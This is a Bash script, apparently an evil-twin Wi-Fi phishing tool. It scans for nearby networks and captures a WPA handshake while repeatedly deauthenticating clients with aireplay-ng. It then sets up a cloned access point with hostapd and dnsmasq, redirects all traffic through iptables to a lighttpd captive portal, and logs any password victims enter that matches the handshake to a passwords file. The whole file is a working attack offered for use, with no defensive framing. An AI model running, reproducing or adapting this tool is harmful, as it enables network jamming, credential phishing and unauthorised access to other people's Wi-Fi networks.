#!/bin/bash


################Colors####################

	RED=$(echo -e "\e[1;31m")
	BLU=$(echo -e "\e[1;36m")
	GRN=$(echo -e "\e[1;32m")



echo $RED
root=`whoami`
if [ "$root" != "root" ]
then
echo "you must be root ! try again with sudo " 
exit
fi

clear

echo $BLU
sudo mkdir passwords > /dev/null 2>&1
############check install##################
CHECK_INSTALL(){
echo $RED
cat evil.txt
installed=0
$GRE
echo $BLU
echo " I will check some package installed ! "
echo ""
software=("hostapd" "dnsmasq"  "airmon-ng" "airodump-ng" "aircrack-ng" "aireplay-ng" "lighttpd" "php" "php-cgi" "fuser"  )
for pkg in "${software[@]}"
do
sleep 0.5
if ! command -v $pkg &> /dev/null
then 
echo $BLU
echo $pkg  "-------->$RED Not install"
installed=$(($installed + 1))
else 
echo $BLU
echo $pkg  "-------->$GRN installed"
fi 
done

if [  $installed -eq 0 ]
then 
echo ""
else 
echo ""
echo $RED "you have $installed pkg NOT install please install it and try again !"
exit
fi
sleep 0.5
clear
}
###############################################    


mkdir info 2> /dev/null
mkdir handshake 2> /dev/null


rm info/* 2> /dev/null

sudo iw mon0 del > /dev/null 2>&1
sudo fuser -k 53/tcp > /dev/null 2>&1
sudo fuser -k 80/tcp > /dev/null 2>&1
sudo pkill hostapd > /dev/null 2>&1
sudo pkill dnsmasq > /dev/null 2>&1


################list_interface_and_select_one_and_convert_to_monitor_mode###############
CHECK_MONITOR(){
echo $RED
cat evil.txt
sudo iw dev | grep Interface | cut -d '' -f2 > info/interfacess.txt 
empty=`cat info/interfacess.txt`
if [ -z $empty ] 2> /dev/null
then
echo $RED "Sorry you don't have any interface cart or mabye not active..... "
else
awk -F" " '{ print $2}' info/interfacess.txt > info/interface.txt
echo $BLU
ni=1
echo  "══════════════════════════════════════════════════"
while read -r i
do 
echo "$ni)"  $i

ni=$(($ni+1))
done < info/interface.txt
echo  "══════════════════════════════════════════════════"
echo $BLU
read -p  "Select the interface ==> " interface 

interf=`awk '{if(NR==interface) print $1}' interface=$interface info/interface.txt`
sudo airmon-ng check kill  > /dev/null 2>&1 
sudo airmon-ng start $interf  > /dev/null 2>&1 
sudo systemctl start NetworkManager
echo  "══════════════════════════════════════════════════"
echo $GRN 'Convert to monitot mode success....'
echo  $BLU"══════════════════════════════════════════════════"

clear
fi 
} 


SCANNING(){
echo ""
echo $RED
cat evil.txt

name="output"
echo $BLU "══════════════════════════════════════════════════"
echo $GRN "searching ....."
echo $BLU "please let him 30 secend at lest"
echo $RED "Hit Ctrl + c to stop search"
echo $BLU "══════════════════════════════════════════════════"
sudo xterm -geometry 100x30-0+0 -e airodump-ng   -w info/$name  $interf 2> /dev/null
sudo xterm -geometry 100x30-0+0 -e airodump-ng   -w info/$name  $interf"mon" 2> /dev/null



}



CLIENTS(){


sudo awk -F "\"*,\"*" '{print $1 , $6}' info/$name-01.csv > info/cliens.txt 

cat  -n info/cliens.txt > info/cliens2.txt

numline=1
while read -r linec
do 

if [[ $linec == *Station* ]]
then
sudo awk -F " " '{print $3}'



fi
done < info/cliens2.txt > info/cliens3.txt



sudo rm info/cliens2.txt
sudo rm info/cliens.txt

}


#######################Select_Wifi_Network##################### 
SELECT(){
clear
echo $RED
cat evil.txt

sudo awk -F "\"*,\"*" '{if(NR!=2 && NR!=1) print $14,"|"$4,"|"$1}' info/$name-01.csv  > info/wifi_csv_0.txt

while read -r line 
do 
if [[ $line != \|* ]]
then

echo $line
else 
break
fi
    
done < info/wifi_csv_0.txt > info/wifi_csv.txt
rm info/wifi_csv_0.txt

n=1
echo $BLU "══════════════════════════════════════════════════════════════════"
echo $GRN "  BSSID                CHANNEL     CLIENTS         ESSID"
echo $BLU "══════════════════════════════════════════════════════════════════"
while read -r i
do 

CHANNEL=`awk -F"|" '{if(NR==n) print $2}' n=$n info/wifi_csv.txt `
BSSID=`awk -F"|" '{if(NR==n)  print $3}'  n=$n info/wifi_csv.txt `
ESSID=`awk -F"|" '{if(NR==n)  print $1}' n=$n  info/wifi_csv.txt `
CLIENTS=`cat info/cliens3.txt | grep -e "$BSSID" | wc -l`



echo $n')'  $BSSID"      "$CHANNEL"          "$CLIENTS"            "$ESSID
echo $BLU "-------------------------------------------------------------------"

n=$(($n+1))

done < info/wifi_csv.txt

empty_wifi=`cat info/wifi_csv.txt `

if [ -z $empty_wifi ] 2> /dev/null
then 
echo $RED "There is on wifi network araoud you ......"
exit
else
echo $BLU



fi 

read -p "Choose network ==> " n 
CHANNEL=`awk -F"|" '{if(NR==n) print $2}' n=$n info/wifi_csv.txt `
BSSID=`awk -F"|" '{if(NR==n)  print $3}'  n=$n info/wifi_csv.txt `
ESSID=`awk -F"|" '{if(NR==n)  print $1}' n=$n  info/wifi_csv.txt `

WESSID=${ESSID/% /}

}

#############check handshake###############
CHECK_HANDSHAKE(){
clear
echo $RED
cat evil.txt
echo $BLU
read -p "do you have a handshake ? answer 'n' to start catch a new handshake [N/y] " check_hand

case $check_hand in
n|N)
sudo xterm -geometry 100x30-0+0 -e airodump-ng --bssid $BSSID --channel $CHANNEL --write "info/$WESSID" $interf & 2> /dev/null
sudo xterm -geometry 100x30-0+0 -e airodump-ng --bssid $BSSID --channel $CHANNEL --write "info/$WESSID" $interf"mon" & 2> /dev/null

while true 
do


if [ -f "info/$WESSID-01.cap" ]; then 2> /dev/null
    # Use airodump-ng to check if the file contains a handshake
    if aircrack-ng "info/$WESSID-01.cap" | grep -q "(1 handshake)"; then
        echo $GRN "Handshake file is complete ..."
        
        
        break
    else
        echo "Handshake file is incomplete yet...."
    fi
else
    echo "Wait The Handshake ....."
fi
sudo xterm -geometry 100x30-0-0 -e aireplay-ng --deauth 4 --ignore-negative-one -a $BSSID  $interf &
sudo xterm -geometry 100x30-0-0 -e aireplay-ng --deauth 4 --ignore-negative-one -a $BSSID  $interf"mon" &

sleep 7s
done


mv "info/$WESSID-01.cap" handshake

path_hand=handshake/$WESSID-01.cap

rm info/*

;;

y|Y)
echo ""
read -p "Enter the handshake path file ==> " path
path_hand=${path//\'/}


echo "done"

;;
*)

sudo xterm -geometry 100x30-0+0 -e airodump-ng --bssid $BSSID --channel $CHANNEL --write "info/$WESSID" $interf & 2> /dev/null &
sudo xterm -geometry 100x30-0+0 -e airodump-ng --bssid $BSSID --channel $CHANNEL --write "info/$WESSID" $interf"mon" & 2> /dev/null &

while true 
do


if [ -f "info/$WESSID-01.cap" ]; then 2> /dev/null
    # Use airodump-ng to check if the file contains a handshake
    if aircrack-ng "info/$WESSID-01.cap" | grep -q "(1 handshake)"; then
        echo $GRN "Handshake file is complete ..."
        
        
        break
    else
        echo "Handshake file is incomplete yet...."
    fi
else
    echo "Wait The Handshake ....."
fi
sudo xterm -geometry 100x30-0-0 -e aireplay-ng --deauth 4 --ignore-negative-one -a $BSSID  $interf &
sudo xterm -geometry 100x30-0-0 -e aireplay-ng --deauth 4 --ignore-negative-one -a $BSSID  $interf"mon" &

sleep 7s
done


mv "info/$WESSID-01.cap" handshake

path_hand=handshake/$WESSID-01.cap

rm info/*

;;

esac





}





#############check_pass######################
CHECK_PASS(){


# sudo echo "aircrack-ng '$WESSID.cap' -w 'pass_check.txt' | grep \"KEY FOUND\"" > air.txt
sudo echo "aircrack-ng 'evil.cap' -w 'pass_check.txt' | grep \"KEY FOUND\"" > air.txt



}

###################web page####################

SELECT_PAGES(){
    clear
    echo $RED
    cat evil.txt
    echo $BLU
   dir=`ls pages/`
   echo "select  a web page number ! "
   echo ""
   
  

   select page in $dir
   do
   sudo mkdir /tmp/$page > /dev/null 2>&1
   sudo rm /tmp/$page/* > /dev/null 2>&1
   sudo cp -r pages/$page/* /tmp/$page/

   
   break
   done 

sudo mv air.txt /tmp/$page



}

LIGHTTPD(){

    echo "
server.modules = (
	\"mod_indexfile\",
	\"mod_access\",
	\"mod_alias\",
 	\"mod_redirect\",
  \"mod_openssl\",
)



server.document-root        = \"/tmp/$page\"
server.upload-dirs          = ( \"/var/cache/lighttpd/uploads\" )
server.errorlog             = \"/var/log/lighttpd/error.log\"
server.pid-file             = \"/run/lighttpd.pid\"
server.username             = \"www-data\"
server.groupname            = \"www-data\"
server.port                 = 80

server.feature-flags       += (\"server.h2proto\" => \"enable\")
server.feature-flags       += (\"server.h2c\"     => \"enable\")
server.feature-flags       += (\"server.graceful-shutdown-timeout\" => 5)

server.http-parseopts = (
  \"header-strict\"           => \"enable\",
  \"host-strict\"             => \"enable\",
  \"host-normalize\"          => \"enable\",
  \"url-normalize-unreserved\"=> \"enable\",
  \"url-normalize-required\"  => \"enable\",
  \"url-ctrls-reject\"        => \"enable\",
  \"url-path-2f-decode\"      => \"enable\",
  \"url-path-dotseg-remove\"  => \"enable\",
  
 
)

index-file.names            = ( \"index.php\", \"index.html\" )
url.access-deny             = ( \"~\", \".inc\" )
static-file.exclude-extensions = ( \".php\", \".pl\", \".fcgi\" )

include_shell \"/usr/share/lighttpd/use-ipv6.pl \" + server.port
include_shell \"/usr/share/lighttpd/create-mime.conf.pl\"
include \"/etc/lighttpd/conf-enabled/*.conf\"

server.modules += (
	\"mod_dirlisting\",
	\"mod_staticfile\",
)
server.modules += ( \"mod_fastcgi\" )
 index-file.names += ( \"index.php\" )
 fastcgi.server += ( \".php\" =>
       ((
    \"socket\" => \"/tmp/php-fastcgi.socket\",
    \"bin-path\" => \"/usr/bin/php-cgi\"
       ))
   )
\$HTTP[\"host\"] !~ \"10.0.0.1\" {
  \$HTTP[\"scheme\"] == \"http\" {
    url.redirect = (\".*\" => \"http://10.0.0.1/\")
  }
  \$HTTP[\"scheme\"] == \"https\" {
    url.redirect = (\".*\" => \"https://10.0.0.1/\")
  }
}



  
  \$HTTP[\"host\"] !~ \"10.0.0.1\" {
    url.redirect = (\".*\" => \"https://10.0.0.1/\")
  }


    
    " > /tmp/evil_lighttpd.conf

sudo cp "$path_hand" /tmp/$page
sleep 1
sudo mv /tmp/$page/*.cap /tmp/$page/evil.cap 
sudo chmod 777 /tmp/$page/*
sudo lighttpd -D -f /tmp/evil_lighttpd.conf &
}


HOTSPOT(){

sudo iw $interf interface add mon0 type monitor  > /dev/null 2>&1
sudo iw $interf"mon" interface add mon0 type monitor > /dev/null 2>&1
sudo airmon-ng start mon0 > /dev/null 2>&1
 
###########DNSMASQ##############
    
    echo "interface=mon0
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,8h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
    
    " > info/dnsmasq.conf
#############hastapd###################



echo "interface=mon0
driver=nl80211
ssid=$WESSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0


" > info/hostapd.conf


sudo ifconfig mon0 up 10.0.0.1 netmask 255.255.255.0 
sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1


 
sudo xterm -fg blue -geometry 100x30+0+0  -hold -e dnsmasq -C info/dnsmasq.conf -d &
sudo xterm -geometry 100x30-0-0  -hold -e hostapd info/hostapd.conf  &



 

sudo xterm -fg red -geometry 100x30-0+0 -e aireplay-ng -0 0 -R --ignore-negative-one -a $BSSID  $interf"mon" &
sudo xterm -fg red -geometry 100x30-0+0 -e aireplay-ng -0 0 -R --ignore-negative-one -a $BSSID  $interf &

}

##############redirect###############
REDIR(){

iptables --flush
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
iptables --append FORWARD --in-interface mon0 -j ACCEPT 
iptables -t nat -A POSTROUTING -j MASQUERADE
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination 10.0.0.1
sudo iptables -t nat -A PREROUTING -i mon0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A PREROUTING -i mon0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.0.0.1:443
echo 1 > /proc/sys/net/ipv4/ip_forward

}

###########show pass############
SHOW_PASS(){
    

  sudo  xterm -fg green -geometry 100x30+0-0 -hold -e "
    while true
    do
    echo \"waiting .......\"
    echo
    
    echo -n \"Number of clients : \"
    sudo iw dev mon0 station dump | grep Station | wc -l
    echo
    echo
    echo -n \"client try wrong password : \" 
    cat /tmp/$page/pass_check.txt
    
    sleep 2
    clear
    if [ -f /tmp/$page/pass_check.txt ]
    then
    
    if cat /tmp/$page/pass_check.txt | grep  \"The Password is\" 
    then  
    sudo pkill xterm 
     
     break
     break
    else
    continue
    fi
    fi
    done

  "
pkill hostapd
pkill dnsmasq
echo $GRN
echo "you will found password in password folder"
echo "Slam :) <3"
passw0rd=`cat /tmp/$page/pass_check.txt `
date=`date`
echo "
================================
date :$date

Wifi_Network_Name :$ESSID

MAC_address : $BSSID

$passw0rd 
================================
" >> passwords/passwords.txt
xterm -geometry 100x30+0-0 -hold -e echo  "
$GRE $passw0rd

" &
    sudo iw dev mon0 del > /dev/null 2>&1
    sudo iw dev wlp4s0 set type managed > /dev/null 2>&1
    sudo airmon-ng stop $interf > /dev/null 2>&1
    sudo airmon-ng stop $interf"mon" > /dev/null 2>&1
exit
}

sigint_handler() {
    sudo iw dev mon0 del > /dev/null 2>&1
    sudo iw dev wlp4s0 set type managed > /dev/null 2>&1
    sudo airmon-ng stop $interf > /dev/null 2>&1
    sudo airmon-ng stop $interf"mon" > /dev/null 2>&1


    echo $GRN 
    echo "stoping monitor mode "
    echo "see you agian"

    exit 1
}
trap 'sigint_handler' SIGINT


CHECK_INSTALL
CHECK_MONITOR
SCANNING
CLIENTS
SELECT
CHECK_HANDSHAKE
CHECK_PASS
SELECT_PAGES
LIGHTTPD
HOTSPOT &
REDIR 
SHOW_PASS





